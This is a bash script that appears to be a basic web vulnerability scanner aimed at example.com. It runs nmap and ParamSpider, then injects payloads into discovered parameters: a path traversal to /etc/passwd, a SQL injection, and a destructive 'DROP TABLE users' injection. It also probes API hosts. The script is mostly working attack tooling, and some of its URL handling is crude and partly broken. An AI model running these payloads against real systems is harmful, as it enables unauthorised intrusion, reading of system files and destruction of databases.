#!/bin/bash

# Define variables for the script
target="example.com"
output_directory="output"
nmap_options="-sS -T4"
paramspider_options="-o $output_directory/paramspider_scan.txt --exclude jpg,jpeg,png,gif,css,js -d"
path_traversal_payload="../etc/passwd"
code_injection_payload="'; SELECT version(); --"
database_payload="'; DROP TABLE users; --"
api_endpoints=("api.example.com" "api2.example.com")

# Create the output directory if it doesn't exist
mkdir -p "$output_directory"

# Perform an nmap scan on the target and output to a file
echo "Running nmap scan on $target..."
nmap $nmap_options -oN "$output_directory/nmap_scan.txt" "$target"

# Check if any open ports were found
if grep -q "open" "$output_directory/nmap_scan.txt"; then
  echo "Open ports found. Starting vulnerability scan..."
  
  # Identify parameters using ParamSpider and output to a file
  echo "Running ParamSpider on $target..."
  paramspider $paramspider_options "$target" > "$output_directory/paramspider_output.txt"

  # Perform path traversal scanning
  echo "Scanning for path traversal vulnerabilities on $target..."
  while IFS= read -r param; do
    curl -s "$target/$param=$path_traversal_payload" | grep -q "root:"
    if [ $? -eq 0 ]; then
      echo "Path traversal vulnerability found in parameter: $param"
    fi
  done < "$output_directory/paramspider_output.txt"

  # Perform code injection scanning
  echo "Scanning for code injection vulnerabilities on $target..."
  while IFS= read -r param; do
    curl -s "$target/$param=$code_injection_payload" | grep -q "MySQL"
    if [ $? -eq 0 ]; then
      echo "Code injection vulnerability found in parameter: $param"
    fi
  done < "$output_directory/paramspider_output.txt"

  # Perform database vulnerability scanning
  echo "Scanning for database vulnerabilities on $target..."
  while IFS= read -r param; do
    curl -s "$target/$param=$database_payload" | grep -q "ERROR 1146"
    if [ $? -eq 0 ]; then
      echo "Database vulnerability found in parameter: $param"
    fi
  done < "$output_directory/paramspider_output.txt"

  # Perform API scanning
  echo "Scanning for exposed APIs on $target..."
  for api_endpoint in "${api_endpoints[@]}"; do
    curl -s "$api_endpoint" | grep -q "API documentation"
    if [ $? -eq 0 ]; then
      echo "API found at: $api_endpoint"
    fi
  done
else
  echo "No open ports found. Skipping vulnerability scan."
fi

echo "Script complete."
